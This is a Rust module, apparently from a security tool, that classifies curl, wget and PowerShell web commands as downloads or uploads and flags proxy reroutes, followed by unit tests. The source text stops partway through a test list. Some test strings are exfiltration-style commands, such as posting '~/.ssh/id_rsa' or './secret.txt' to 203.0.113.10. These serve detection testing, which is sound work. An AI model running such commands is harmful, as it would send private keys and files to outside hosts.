//! Native HTTP direction for action findings: whether one tokenized command
//! segment downloads or uploads. This classifies command text, not observed
//! network activity. Hostnames are never resolved; only a parsed literal
//! loopback IP is exempt from download.
//!
//! The same reading returns what the upload destination facts need (the
//! request targets, and whether anything can send the request elsewhere), so
//! the upload rule and its facts cannot disagree about one invocation. Its
//! option tables are the only ones: a reading that meets an option it does not
//! know keeps the direction it had and marks the request unread.
//!
//! Session Rule v1 content keeps its own self-describing YAML predicates. This
//! parser is the higher-precision native profile and is not a public API.

use std::net::IpAddr;

// The client lookup behind wrappers and assignments is shared with the
// command-effect reader.
use telltale_rules::command_effect::runs_elsewhere;
pub(crate) use telltale_rules::command_effect::{assignment, client_name, invocation};

/// Download clients, by normalized command word.
const DOWNLOAD_CLIENTS: [&str; 8] = [
    "curl",
    "wget",
    "aria2c",
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
    "fetch",
];

/// curl short options that take a value, attached or in the next token.
const CURL_VALUE_FLAGS: &str = "AbcCdDeEFHKmoPQrtTuUwxXyYz";

/// The segment's client invocation, if it downloads.
pub(crate) fn download_candidate(tokens: &[String]) -> Option<&[String]> {
    invocation(tokens, &DOWNLOAD_CLIENTS).filter(|command| {
        let request = request(command);
        request.url_seen && (request.non_loopback || request.rerouted) && !request.upload
    })
}

/// Whether the segment's download client runs on another host or in a
/// container (`ssh host curl …`, `docker exec c curl …`).
pub(crate) fn downloads_elsewhere(tokens: &[String]) -> bool {
    runs_elsewhere(tokens, &DOWNLOAD_CLIENTS)
}

/// Whether the segment's client is a Windows program (`curl.exe`) or a
/// PowerShell cmdlet, whose shell keeps a backslash as text.
pub(crate) fn windows_client(tokens: &[String]) -> bool {
    invocation(tokens, &DOWNLOAD_CLIENTS).is_some_and(|command| {
        command[0].to_ascii_lowercase().ends_with(".exe")
            || matches!(
                client_name(&command[0]).as_str(),
                "invoke-webrequest" | "iwr" | "invoke-restmethod" | "irm"
            )
    })
}

/// Upload clients, by normalized command word.
const UPLOAD_CLIENTS: [&str; 6] = [
    "curl",
    "wget",
    "invoke-webrequest",
    "iwr",
    "invoke-restmethod",
    "irm",
];

/// Whether the segment's curl, wget or PowerShell web cmdlet invocation
/// uploads.
#[cfg(test)]
pub(crate) fn is_upload(tokens: &[String]) -> bool {
    upload_request(tokens).is_some()
}

/// The segment's curl, wget or PowerShell web cmdlet request, with the index
/// of its client word, if it uploads.
pub(crate) fn upload_request(tokens: &[String]) -> Option<(usize, Request<'_>)> {
    let command = invocation(tokens, &UPLOAD_CLIENTS)?;
    let request = request(command);
    request
        .upload
        .then(|| (tokens.len() - command.len(), request))
}

/// What one reading of a client invocation found. The upload rule and the
/// destination facts beside it both take this reading, so they cannot
/// disagree about what is a URL, an option value or a reroute.
#[derive(Default)]
pub(crate) struct Request<'a> {
    pub(crate) upload: bool,
    url_seen: bool,
    non_loopback: bool,
    rerouted: bool,
    /// The words the client reads as request URLs, as written: its operands
    /// and the values of its URL options. A redirection's target is not one.
    pub(crate) targets: Vec<&'a str>,
    /// The values of its request data and form options.
    pub(crate) payload: Vec<&'a str>,
    /// The reading met something that can send the request elsewhere than
    /// its targets or that it cannot account for: a proxy, resolve,
    /// connect-to, socket or config option, a further request, a header
    /// naming a host, splatting, or an unknown or abbreviated option.
    pub(crate) unread: bool,
    /// The client may follow a redirect, which can re-send the body to a host
    /// no word names: curl with `-L`, wget and the cmdlets unless told not to.
    pub(crate) redirects: bool,
}

impl<'a> Request<'a> {
    fn url(&mut self, token: &'a str) {
        self.targets.push(token);
        self.seen(token);
    }

    /// Reads a word for direction only. The base reading took every operand
    /// for a URL, a redirection's target included, and direction still does.
    fn seen(&mut self, token: &str) {
        let Some((scheme, rest)) = token.split_once("://") else {
            return;
        };
        // A `)` or backtick closes a command substitution around the URL.
        let authority = rest
            .split(['/', '?', '#', ')', '`'])
            .next()
            .unwrap_or_default();
        if ["http", "https", "ftp"]
            .iter()
            .any(|allowed| scheme.eq_ignore_ascii_case(allowed))
            && !authority.is_empty()
            && !authority
                .chars()
                .any(|ch| ch.is_whitespace() || matches!(ch, '|' | ';' | '&' | '"' | '\'' | '\\'))
        {
            self.url_seen = true;
            self.non_loopback |= !literal_loopback(authority);
        }
    }

    /// An operand: a redirection, the target of one, or a request URL.
    /// Returns whether the next word is a redirection's target.
    fn operand(&mut self, token: &'a str, redirected: bool) -> bool {
        if redirected {
            self.seen(token);
            return false;
        }
        match redirection(token) {
            Some(next) => {
                self.seen(token);
                next
            }
            None => {
                self.url(token);
                false
            }
        }
    }

    /// A curl or wget header. `@file` reads header lines from a file or
    /// stdin. A `Host` or `:authority` header can reach another virtual host
    /// or upstream behind the target. A header without a name is unread.
    fn header(&mut self, value: &str) {
        let value = value.trim_start();
        if value.starts_with('@') {
            self.unread = true;
            return;
        }
        let (pseudo, text) = match value.strip_prefix(':') {
            Some(text) => (true, text),
            None => (false, value),
        };
        match text.split_once([':', ';']) {
            Some((name, _)) => self.overrides_host(pseudo, name),
            None => self.unread = true,
        }
    }

    /// A PowerShell `-Headers` value: a literal `@{name = value; ...}` table,
    /// read the same way. Anything else (a variable, an expression, a value
    /// holding the separator) is unread.
    fn header_table<'b>(&mut self, words: impl Iterator<Item = &'b str>) {
        let text = words.collect::<Vec<_>>().join(" ");
        let Some(entries) = text
            .trim()
            .strip_prefix("@{")
            .and_then(|table| table.strip_suffix('}'))
        else {
            self.unread = true;
            return;
        };
        for entry in entries.split([';', '\n']) {
            if entry.trim().is_empty() {
                continue;
            }
            let Some((name, _)) = entry.split_once('=') else {
                self.unread = true;
                return;
            };
            let name = name.trim();
            let name = [('\'', '\''), ('"', '"')]
                .iter()
                .find_map(|(open, close)| name.strip_prefix(*open)?.strip_suffix(*close))
                .unwrap_or(name);
            if name.is_empty()
                || !name
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b':'))
            {
                self.unread = true;
                return;
            }
            let (pseudo, name) = match name.strip_prefix(':') {
                Some(name) => (true, name),
                None => (false, name),
            };
            self.overrides_host(pseudo, name);
        }
    }

    fn overrides_host(&mut self, pseudo: bool, name: &str) {
        let name = name.trim();
        self.unread |= if pseudo {
            name.eq_ignore_ascii_case("authority")
        } else {
            name.eq_ignore_ascii_case("host")
        };
    }
}

/// Whether a word is a shell redirection (`>f`, `2>&1`, `<<EOF`, PowerShell
/// `*>f`): `Some(true)` when its target is the next word.
fn redirection(token: &str) -> Option<bool> {
    let rest = token.trim_start_matches(|ch: char| ch.is_ascii_digit());
    let rest = rest.strip_prefix(['&', '*']).unwrap_or(rest);
    if !rest.starts_with(['<', '>']) {
        return None;
    }
    Some(rest.trim_start_matches(['<', '>', '&', '|']).is_empty())
}
/// Whether a URL authority names a literal loopback IP: 127.0.0.0/8, `::1`
/// in any textual form, or IPv4-mapped 127.0.0.0/8. `localhost` is a name.
pub(super) fn literal_loopback(authority: &str) -> bool {
    let host_port = authority.rsplit('@').next().unwrap_or_default();
    let host = if let Some(bracketed) = host_port.strip_prefix('[') {
        let Some((host, suffix)) = bracketed.split_once(']') else {
            return false;
        };
        if !suffix.is_empty()
            && !suffix
                .strip_prefix(':')
                .is_some_and(|port| port.parse::<u16>().is_ok())
        {
            return false;
        }
        host
    } else {
        let (host, port) = host_port.split_once(':').unwrap_or((host_port, ""));
        if !port.is_empty() && port.parse::<u16>().is_err() {
            return false;
        }
        host
    };
    match host.parse::<IpAddr>() {
        Ok(IpAddr::V4(ip)) => ip.is_loopback(),
        Ok(IpAddr::V6(ip)) => {
            ip.is_loopback() || ip.to_ipv4_mapped().is_some_and(|ip| ip.is_loopback())
        }
        Err(_) => false,
    }
}

/// curl request data: `@file` (and `name@file` for `--data-urlencode`) is
/// read from a file; `--data-raw` never is.
fn file_data(flag: &str, value: &str) -> bool {
    match flag {
        "data-raw" => false,
        "data-urlencode" => value
            .split_once('=')
            .map_or(value, |(name, _)| name)
            .contains('@'),
        _ => value.starts_with('@'),
    }
}

fn upload_method(method: &str) -> bool {
    ["POST", "PUT", "PATCH"]
        .iter()
        .any(|upload| method.eq_ignore_ascii_case(upload))
}

/// curl short options that take no value. `-K` (config), `-x` (proxy) and
/// `-:` (next request) are read on their own; any other letter is unknown.
const CURL_FLAGS: &str = "012346#aBfgGhiIjJklLMnNOpqRsSvVZ";
/// curl long options that take a value this reading has no other use for.
const CURL_VALUES: &[&str] = &[
    "user-agent",
    "referer",
    "output",
    "output-dir",
    "dump-header",
    "cookie",
    "cookie-jar",
    "user",
    "max-time",
    "connect-timeout",
    "retry",
    "retry-delay",
    "retry-max-time",
    "max-redirs",
    "write-out",
    "cacert",
    "capath",
    "cert",
    "cert-type",
    "key",
    "key-type",
    "pass",
    "limit-rate",
    "max-filesize",
    "range",
    "continue-at",
    "oauth2-bearer",
    "aws-sigv4",
    "trace",
    "trace-ascii",
    "stderr",
];
/// curl long options that take no value.
const CURL_LONG_FLAGS: &[&str] = &[
    "silent",
    "show-error",
    "fail",
    "fail-with-body",
    "insecure",
    "compressed",
    "verbose",
    "include",
    "head",
    "globoff",
    "location",
    "location-trusted",
    "http1.0",
    "http1.1",
    "http2",
    "http2-prior-knowledge",
    "no-progress-meter",
    "progress-bar",
    "ipv4",
    "ipv6",
    "remote-name",
    "remote-header-name",
    "remote-time",
    "create-dirs",
    "no-buffer",
    "no-keepalive",
    "netrc",
    "netrc-optional",
    "disable",
    "path-as-is",
    "retry-all-errors",
    "retry-connrefused",
    "basic",
    "digest",
    "anyauth",
];
/// curl long options that send the request through another host or address;
/// each takes a value.
const CURL_REROUTES: &[&str] = &[
    "proxy",
    "preproxy",
    "proxy1.0",
    "socks4",
    "socks4a",
    "socks5",
    "socks5-hostname",
    "connect-to",
    "resolve",
];
/// curl long options that take a value and change where the request goes or
/// what it reads beyond its words: a socket, a config file, a resolver or a
/// cached alternative service.
const CURL_UNREAD_VALUES: &[&str] = &[
    "proxy-user",
    "unix-socket",
    "abstract-unix-socket",
    "config",
    "doh-url",
    "dns-servers",
    "alt-svc",
];

/// wget short options that take a value (`-e`, `-i` and `-B` are read on their
/// own), and those that take none. `-n` takes one of `vcdHp`.
const WGET_SHORT_VALUES: &str = "aADIlOoPQRtTUwX";
const WGET_SHORT_FLAGS: &str = "46bcdEFhHkKLmNpqrSvVx";
/// wget long options that take a value this reading has no other use for.
const WGET_VALUES: &[&str] = &[
    "output-document",
    "output-file",
    "append-output",
    "user-agent",
    "timeout",
    "tries",
    "wait",
    "user",
    "password",
    "http-user",
    "http-password",
    "directory-prefix",
    "max-redirect",
    "limit-rate",
    "ca-certificate",
    "certificate",
    "private-key",
    "load-cookies",
    "save-cookies",
];
/// wget long options that take no value.
const WGET_LONG_FLAGS: &[&str] = &[
    "quiet",
    "no-verbose",
    "verbose",
    "debug",
    "server-response",
    "no-check-certificate",
    "spider",
    "content-on-error",
    "no-cache",
    "continue",
    "timestamping",
    "no-clobber",
    "show-progress",
    "inet4-only",
    "inet6-only",
    "auth-no-challenge",
    "ignore-length",
    "keep-session-cookies",
    "no-config",
];

/// Parses one client invocation: `tokens[0]` is the client.
pub(crate) fn request(tokens: &[String]) -> Request<'_> {
    let client = client_name(&tokens[0]);
    if matches!(
        client.as_str(),
        "invoke-webrequest" | "iwr" | "invoke-restmethod" | "irm"
    ) {
        return powershell_request(tokens);
    }
    let (curl, wget) = (client == "curl", client == "wget");
    let mut get = false;
    let mut data = false;
    let mut file = false;
    let mut redirected = false;
    let mut request = Request {
        redirects: wget,
        ..Request::default()
    };
    let mut rest = tokens.iter().skip(1);
    while let Some(token) = rest.next() {
        if std::mem::take(&mut redirected) {
            request.seen(token);
            continue;
        }
        if token == "--" {
            for token in rest.by_ref() {
                redirected = request.operand(token, redirected);
            }
            break;
        }
        if let Some(long) = token.strip_prefix("--") {
            let (flag, attached) = long
                .split_once('=')
                .map_or((long, None), |(flag, value)| (flag, Some(value)));
            let mut value = || {
                attached
                    .or_else(|| rest.next().map(String::as_str))
                    .unwrap_or_default()
            };
            match flag {
                "get" if curl => get = true,
                "request" if curl => request.upload |= upload_method(value()),
                "method" if wget => request.upload |= upload_method(value()),
                "data" | "data-ascii" | "data-binary" | "data-raw" | "data-urlencode" | "json"
                    if curl =>
                {
                    data = true;
                    let value = value();
                    file |= file_data(flag, value);
                    request.payload.push(value);
                }
                "form" | "form-string" | "upload-file" if curl => {
                    request.payload.push(value());
                    request.upload = true;
                }
                // wget accepts unambiguous abbreviations such as `--post-f`.
                _ if wget && (flag.starts_with("post-") || flag.starts_with("body-")) => {
                    request.payload.push(value());
                    request.upload = true;
                }
                _ if curl && CURL_REROUTES.contains(&flag) => {
                    value();
                    request.rerouted = true;
                    request.unread = true;
                }
                _ if curl && CURL_UNREAD_VALUES.contains(&flag) => {
                    value();
                    request.unread = true;
                }
                "url" if curl => request.url(value()),
                "location" | "location-trusted" if curl && attached.is_none() => {
                    request.redirects = true;
                }
                // A tunnel through a proxy set elsewhere.
                "proxytunnel" if curl => request.unread = true,
                "max-redirect" if wget => request.redirects = value() != "0",
                "header" if curl || wget => request.header(value()),
                _ if curl && CURL_VALUES.contains(&flag) => {
                    value();
                }
                _ if curl && CURL_LONG_FLAGS.contains(&flag) && attached.is_none() => {}
                // A base URL or a URL list: the URLs requested are not all
                // in the words, though this one is still read as a URL.
                "base" | "input-file" if wget => {
                    request.url(value());
                    request.unread = true;
                }
                // wgetrc commands can set a proxy or anything else.
                "execute" | "config" if wget => {
                    value();
                    request.unread = true;
                }
                _ if wget && WGET_VALUES.contains(&flag) => {
                    value();
                }
                _ if wget && WGET_LONG_FLAGS.contains(&flag) && attached.is_none() => {}
                // `--next` starts another request; any other option is
                // unknown, and whether it takes a value is too, so the next
                // word is still read as an operand.
                _ => request.unread = true,
            }
        } else if let Some(short) = token
            .strip_prefix('-')
            .filter(|short| (curl || wget) && !short.is_empty())
        {
            if curl {
                curl_short(
                    short,
                    &mut rest,
                    &mut request,
                    &mut data,
                    &mut file,
                    &mut get,
                );
            } else {
                wget_short(short, &mut rest, &mut request);
            }
        } else if !token.starts_with('-') {
            redirected = request.operand(token, false);
        }
    }
    // `-G` sends data as a query, except data read from a file.
    request.upload |= data && (!get || file);
    request
}

fn curl_short<'a>(
    short: &'a str,
    rest: &mut impl Iterator<Item = &'a String>,
    request: &mut Request<'a>,
    data: &mut bool,
    file: &mut bool,
    get: &mut bool,
) {
    for (offset, flag) in short.char_indices() {
        match flag {
            'G' => *get = true,
            'L' => request.redirects = true,
            // `--proxytunnel`, through a proxy set elsewhere.
            'p' => request.unread = true,
            _ => {}
        }
        if CURL_FLAGS.contains(flag) {
            continue;
        }
        if !CURL_VALUE_FLAGS.contains(flag) {
            // `-:` starts another request; any other letter is unknown.
            request.unread = true;
            continue;
        }
        let tail = &short[offset + flag.len_utf8()..];
        let value = if tail.is_empty() {
            rest.next().map(String::as_str).unwrap_or_default()
        } else {
            tail
        };
        match flag {
            'X' => request.upload |= upload_method(value),
            'd' => {
                *data = true;
                *file |= file_data("data", value);
                request.payload.push(value);
            }
            'F' | 'T' => {
                request.payload.push(value);
                request.upload = true;
            }
            'x' => {
                request.rerouted = true;
                request.unread = true;
            }
            // `-K` reads a config file; `-U` is a proxy's user.
            'K' | 'U' => request.unread = true,
            'H' => request.header(value),
            _ => {}
        }
        break;
    }
}

fn wget_short<'a>(
    short: &'a str,
    rest: &mut impl Iterator<Item = &'a String>,
    request: &mut Request<'a>,
) {
    if let Some(letter) = short.strip_prefix('n') {
        request.unread |= !matches!(letter, "v" | "c" | "d" | "H" | "p");
        return;
    }
    for (offset, flag) in short.char_indices() {
        if WGET_SHORT_FLAGS.contains(flag) {
            continue;
        }
        if !WGET_SHORT_VALUES.contains(flag) && !matches!(flag, 'e' | 'i' | 'B') {
            request.unread = true;
            break;
        }
        let tail = &short[offset + flag.len_utf8()..];
        let value = if tail.is_empty() {
            rest.next().map(String::as_str).unwrap_or_default()
        } else {
            tail
        };
        match flag {
            'i' | 'B' => {
                request.url(value);
                request.unread = true;
            }
            'e' => request.unread = true,
            _ => {}
        }
        break;
    }
}

/// The parameters of `Invoke-WebRequest` and `Invoke-RestMethod` across
/// PowerShell versions, with the common parameters, lowercase, and whether
/// each takes a value. PowerShell resolves an unambiguous prefix of a name.
const POWERSHELL_PARAMETERS: &[(&str, bool)] = &[
    ("allowinsecureredirect", false),
    ("allowunencryptedauthentication", false),
    ("authentication", true),
    ("body", true),
    ("certificate", true),
    ("certificatethumbprint", true),
    ("connectiontimeoutseconds", true),
    ("contenttype", true),
    ("credential", true),
    ("custommethod", true),
    ("debug", false),
    ("disablekeepalive", false),
    ("erroraction", true),
    ("errorvariable", true),
    ("followrellink", false),
    ("form", true),
    ("headers", true),
    ("httpversion", true),
    ("infile", true),
    ("informationaction", true),
    ("informationvariable", true),
    ("maximumfollowrellink", true),
    ("maximumredirection", true),
    ("maximumretrycount", true),
    ("method", true),
    ("noproxy", false),
    ("operationtimeoutseconds", true),
    ("outbuffer", true),
    ("outfile", true),
    ("outvariable", true),
    ("passthru", false),
    ("pipelinevariable", true),
    ("preserveauthorizationonredirect", false),
    ("preservehttpmethodonredirect", false),
    ("progressaction", true),
    ("proxy", true),
    ("proxycredential", true),
    ("proxyusedefaultcredentials", false),
    ("responseheadersvariable", true),
    ("resume", false),
    ("retryintervalsec", true),
    ("sessionvariable", true),
    ("skipcertificatecheck", false),
    ("skipheadervalidation", false),
    ("skiphttperrorcheck", false),
    ("sslprotocol", true),
    ("statuscodevariable", true),
    ("timeoutsec", true),
    ("token", true),
    ("transferencoding", true),
    ("unixsocket", true),
    ("uri", true),
    ("usebasicparsing", false),
    ("usedefaultcredentials", false),
    ("useragent", true),
    ("verbose", false),
    ("warningaction", true),
    ("warningvariable", true),
    ("websession", true),
];
/// The parameters whose value is the request's body.
const POWERSHELL_BODIES: [&str; 3] = ["body", "infile", "form"];

/// A PowerShell parameter name, lowercase, resolved as PowerShell does: the
/// exact name, or the one parameter it is a prefix of. Returns the name,
/// whether it takes a value, and whether it was abbreviated.
fn powershell_parameter(name: &str) -> Option<(&'static str, bool, bool)> {
    if let Some(&(name, value)) = POWERSHELL_PARAMETERS.iter().find(|(p, _)| *p == name) {
        return Some((name, value, false));
    }
    let mut matches = POWERSHELL_PARAMETERS
        .iter()
        .filter(|(parameter, _)| parameter.starts_with(name));
    match (matches.next(), matches.next()) {
        (Some(&(name, value)), None) => Some((name, value, true)),
        _ => None,
    }
}

/// The words of one PowerShell argument from `at`: a parenthesized or braced
/// expression the reader split at its blanks runs until it closes.
fn powershell_argument(tokens: &[String], at: usize, open: i64) -> usize {
    let mut depth = open;
    let mut end = at;
    while depth > 0
        && let Some(token) = tokens.get(end)
    {
        depth += bracket_depth(token);
        end += 1;
    }
    end
}

fn bracket_depth(text: &str) -> i64 {
    text.chars()
        .map(|ch| match ch {
            '(' | '{' => 1,
            ')' | '}' => -1,
            _ => 0,
        })
        .sum()
}

/// Parses a PowerShell `Invoke-WebRequest`/`iwr`/`Invoke-RestMethod`/`irm`
/// invocation. Parameters are case-insensitive, start with a dash (or an
/// en or em dash), take an attached `:value`, and resolve by unambiguous
/// prefix. An abbreviation is read as the parameter it names but leaves the
/// reading unread: which parameter it names depends on the PowerShell
/// version. A name that resolves to no parameter is unread too. It is read
/// as taking no value, so a URL after it is still a target, and as a body
/// when it could abbreviate a body parameter, so an ambiguous abbreviation,
/// which PowerShell rejects, fails toward an upload rather than a download.
fn powershell_request(tokens: &[String]) -> Request<'_> {
    let mut request = Request {
        redirects: true,
        ..Request::default()
    };
    let mut read_method = false;
    let mut body = false;
    let mut redirected = false;
    let mut at = 1;
    while let Some(token) = tokens.get(at) {
        at += 1;
        if std::mem::take(&mut redirected) {
            request.seen(token);
            continue;
        }
        let name = token
            .strip_prefix(['-', '\u{2013}', '\u{2014}', '\u{2015}'])
            .filter(|name| name.starts_with(|ch: char| ch.is_ascii_alphabetic()));
        let Some(name) = name else {
            if token == "--%" {
                // Everything after it goes to the cmdlet unparsed. It is
                // still read, for direction, as unread.
                request.unread = true;
                continue;
            }
            if token
                .strip_prefix('@')
                .is_some_and(|name| name.starts_with(|ch: char| ch.is_alphanumeric() || ch == '_'))
            {
                // `@params` splats arguments this cannot see.
                request.unread = true;
                continue;
            }
            let end = powershell_argument(tokens, at, bracket_depth(token));
            if end > at {
                // An expression computes the URL: no reader can name it.
                request.unread = true;
                for word in &tokens[at - 1..end] {
                    request.url(word);
                }
                at = end;
            } else {
                redirected = request.operand(token, false);
            }
            continue;
        };
        let (name, attached) = name
            .split_once(':')
            .map_or((name, None), |(name, value)| (name, Some(value)));
        let lower = name.to_ascii_lowercase();
        let Some((parameter, takes_value, abbreviated)) = powershell_parameter(&lower) else {
            request.unread = true;
            if POWERSHELL_BODIES
                .iter()
                .any(|body| body.starts_with(&lower))
            {
                request.upload = true;
            }
            continue;
        };
        // Every proxy parameter (credentials included) means a proxy is in use.
        request.unread |= abbreviated || parameter.starts_with("proxy");
        if !takes_value {
            continue;
        }
        // The value: attached, or the next word, through the end of an
        // expression the reader split.
        let (first, words) = match attached {
            Some(value) => {
                let end = powershell_argument(tokens, at, bracket_depth(value));
                let words = &tokens[at..end];
                at = end;
                (value, words)
            }
            None => {
                let Some(first) = tokens.get(at) else {
                    continue;
                };
                let end = powershell_argument(tokens, at + 1, bracket_depth(first));
                let words = &tokens[at + 1..end];
                at = end;
                (first.as_str(), words)
            }
        };
        let values = std::iter::once(first).chain(words.iter().map(String::as_str));
        match parameter {
            "uri" => {
                // An expression computes the URL: no reader can name it.
                request.unread |= !words.is_empty();
                for value in values {
                    request.url(value);
                }
            }
            "method" | "custommethod" => {
                if upload_method(first) {
                    request.upload = true;
                } else if ["GET", "HEAD", "OPTIONS"]
                    .iter()
                    .any(|read| first.eq_ignore_ascii_case(read))
                {
                    read_method = true;
                }
            }
            "body" => {
                request.payload.extend(values);
                body = true;
            }
            "infile" | "form" => {
                request.payload.extend(values);
                request.upload = true;
            }
            "proxy" => {
                request.rerouted = true;
                request.unread = true;
            }
            // A session can carry a proxy.
            "unixsocket" | "websession" => request.unread = true,
            "headers" => request.header_table(values),
            "maximumredirection" => request.redirects = first != "0",
            _ => {}
        }
    }
    // A GET, HEAD or OPTIONS body is sent as a query.
    request.upload |= body && !read_method;
    request
}

#[cfg(test)]
mod tests {
    use super::{download_candidate, is_upload, request};

    fn tokens(command: &str) -> Vec<String> {
        crate::process_chain::tokenize(command)
    }

    #[test]
    fn direction_follows_each_client_invocation() {
        for (command, download, upload) in [
            // The invocation follows leading assignments and wrappers.
            (
                "env NOTE=curl- curl -d @~/.ssh/id_rsa https://203.0.113.10/",
                false,
                true,
            ),
            ("sudo -u deploy curl https://203.0.113.10/a", true, false),
            ("sudo -E curl -d @f https://203.0.113.10/", false, true),
            (
                "env -i PATH=/usr/bin curl https://203.0.113.10/a",
                true,
                false,
            ),
            (
                "timeout -s KILL 30s curl https://203.0.113.10/a",
                true,
                false,
            ),
            ("nice -n 10 wget https://203.0.113.10/a", true, false),
            (
                "xargs -n1 -I{} curl -d @{} https://203.0.113.10/",
                false,
                true,
            ),
            ("SYNTHETIC=1 curl https://203.0.113.10/a", true, false),
            (
                "sudo --user deploy curl -d @f https://203.0.113.10/",
                false,
                true,
            ),
            ("sudo -iu deploy curl https://203.0.113.10/a", true, false),
            ("sudo -uroot curl https://203.0.113.10/a", true, false),
            ("sudo -- curl https://203.0.113.10/a", true, false),
            (
                "timeout --signal KILL 30 curl https://203.0.113.10/a",
                true,
                false,
            ),
            (
                "sudo env A=1 timeout 5 curl https://203.0.113.10/a",
                true,
                false,
            ),
            ("sudo", false, false),
            // A client named as an argument is not an invocation.
            ("git fetch https://203.0.113.10/repo.git main", false, false),
            ("echo curl https://203.0.113.10/a", false, false),
            ("which curl wget https://203.0.113.10/a", false, false),
            ("rg -n curl -d src https://203.0.113.10/", false, false),
            ("sudo curl https://203.0.113.10/a", true, false),
            ("xargs curl -d @- https://203.0.113.10/", false, true),
            ("curl.exe -F f=@x https://203.0.113.10/", false, true),
            // curl's short-flag table applies only to curl.
            ("aria2c -d downloads https://203.0.113.10/a", true, false),
            ("wget -d https://203.0.113.10/a", true, false),
            ("wget -x https://203.0.113.10/a", true, false),
            ("wget -H https://203.0.113.10/a", true, false),
            ("wget -T 10 https://203.0.113.10/a", true, false),
            ("wget --post-file=f https://203.0.113.10/", false, true),
            (
                "wget --method=PUT --body-file=f https://203.0.113.10/",
                false,
                true,
            ),
            // Clustered, case-sensitive curl flags.
            ("curl -sX POST https://203.0.113.10/", false, true),
            ("curl -sXPUT https://203.0.113.10/", false, true),
            ("curl -sf https://203.0.113.10/a", true, false),
            ("curl -sD headers https://203.0.113.10/a", true, false),
            ("curl -odata.bin https://203.0.113.10/a", true, false),
            ("curl --data-ascii x https://203.0.113.10/", false, true),
            ("curl --json @f https://203.0.113.10/", false, true),
            // -G data is a query unless it is read from a file.
            (
                "curl -G --data-urlencode q=x https://203.0.113.10/s",
                true,
                false,
            ),
            (
                "curl -G --data-urlencode d@file https://203.0.113.10/s",
                false,
                true,
            ),
            (
                "curl -G --data-urlencode @file https://203.0.113.10/s",
                false,
                true,
            ),
            (
                "curl -G --data-urlencode q=a@b https://203.0.113.10/s",
                true,
                false,
            ),
            ("curl -sGd q=x https://203.0.113.10/s", true, false),
            ("curl --get -d @file https://203.0.113.10/s", false, true),
            (
                "curl -G --data-raw @literal https://203.0.113.10/s",
                true,
                false,
            ),
            ("curl -G -X POST -d q=x https://203.0.113.10/s", false, true),
            ("curl -G -T f https://203.0.113.10/s", false, true),
            // Proxies, including SOCKS, are reroutes; their arguments are not
            // target URLs.
            (
                "curl --socks5 proxy.example.invalid:1080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl --socks5-hostname proxy.example.invalid:1080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl --socks4a proxy.example.invalid:1080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl --proxy1.0 proxy.example.invalid:8080 http://127.0.0.1/a",
                true,
                false,
            ),
            ("curl -x http://203.0.113.10:8080", false, false),
            ("curl --proxy=http://203.0.113.10:8080", false, false),
            (
                "curl -x http://203.0.113.10:8080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl -e https://203.0.113.10/ http://127.0.0.1/a",
                false,
                false,
            ),
            // Literal loopback in every textual form; names are not exempt.
            ("curl 'http://[0:0:0:0:0:0:0:1]/a'", false, false),
            ("curl 'http://[::0001]:8080/a'", false, false),
            ("curl 'http://[0:0:0:0:0:ffff:7f00:1]/a'", false, false),
            ("curl http://user:synthetic@127.0.0.1:8080/a", false, false),
            ("curl http://localhost/a", true, false),
            ("curl http://127.0.0.1:notaport/a", true, false),
            ("X=$(curl -s http://127.0.0.1)", false, false),
            ("X=$(curl -s http://203.0.113.10)", true, false),
            ("wget --post-f=f https://203.0.113.10/", false, true),
            (
                "wget --body-d=x --meth=PUT https://203.0.113.10/",
                false,
                true,
            ),
            ("curl -d @f http://127.0.0.1/a", false, true),
            (
                "curl -X PATCH -d '{\"a\":1}' https://203.0.113.10/item",
                false,
                true,
            ),
            (
                "Invoke-RestMethod -Method Post -Uri https://203.0.113.10/upload -Body 'payload'",
                false,
                true,
            ),
            (
                "irm -Method Patch -Uri https://203.0.113.10/item -Body 'x'",
                false,
                true,
            ),
            (
                "Invoke-WebRequest -InFile ./secret.txt -Uri https://203.0.113.10/drop",
                false,
                true,
            ),
            (
                "iwr -Uri https://203.0.113.10/form -Form @{f='x'}",
                false,
                true,
            ),
            (
                "Invoke-RestMethod -Method Get -Uri https://203.0.113.10/read",
                true,
                false,
            ),
            (
                "Invoke-WebRequest -Method Head -Uri https://203.0.113.10/ping",
                true,
                false,
            ),
            (
                "Invoke-RestMethod -Uri https://203.0.113.10/post -Body 'implicit-post'",
                false,
                true,
            ),
        ] {
            let tokens = tokens(command);
            assert_eq!(download_candidate(&tokens).is_some(), download, "{command}");
            assert_eq!(is_upload(&tokens), upload, "{command}");
        }
    }

    /// Where reading option values changed curl and wget direction from the
    /// base reading, which took every word after a value option for an
    /// operand. The new reading is what the clients do.
    #[test]
    fn option_values_are_no_urls_and_url_options_are() {
        for (command, download, upload) in [
            // A URL that is only an option's value is no download.
            ("curl -e https://203.0.113.10/r -o out", false, false),
            ("curl --referer https://203.0.113.10/r", false, false),
            ("wget -U https://203.0.113.10/ua", false, false),
            // wget's URL list and base options request what they name.
            ("wget --input-file=https://203.0.113.10/list", true, false),
            ("wget --base=https://203.0.113.10/", true, false),
            ("wget -ihttps://203.0.113.10/list", true, false),
            ("wget -Bhttps://203.0.113.10/", true, false),
            // `-O` takes the next word whatever it looks like.
            ("wget -O --post-data=x https://203.0.113.10/a", true, false),
        ] {
            let tokens = tokens(command);
            assert_eq!(download_candidate(&tokens).is_some(), download, "{command}");
            assert_eq!(is_upload(&tokens), upload, "{command}");
        }
    }

    /// The option tables against the clients' own help (curl 8.18.0
    /// `--help all`, GNU Wget2 2.3.0 `--help`): a letter curl does not have is
    /// unknown, so the reading is unread and the URL after it still read.
    #[test]
    fn option_tables_follow_the_clients_help() {
        let words = tokens("curl -5 https://203.0.113.10/a");
        assert!(download_candidate(&words).is_some());
        assert!(request(&words).unread);
        let words = tokens("curl -4 -6 https://203.0.113.10/a");
        assert!(!request(&words).unread);
    }

    /// PowerShell web cmdlet downloads the base reading matched, which read
    /// every word that is not a parameter as a URL. Each still downloads.
    const POWERSHELL_DOWNLOADS: &[&str] = &[
        "iwr https://203.0.113.10/a -OutFile a",
        "Invoke-WebRequest -Uri https://203.0.113.10/a -OutFile a",
        "irm https://203.0.113.10/api",
        "Invoke-RestMethod -Uri https://203.0.113.10/api -Method Get",
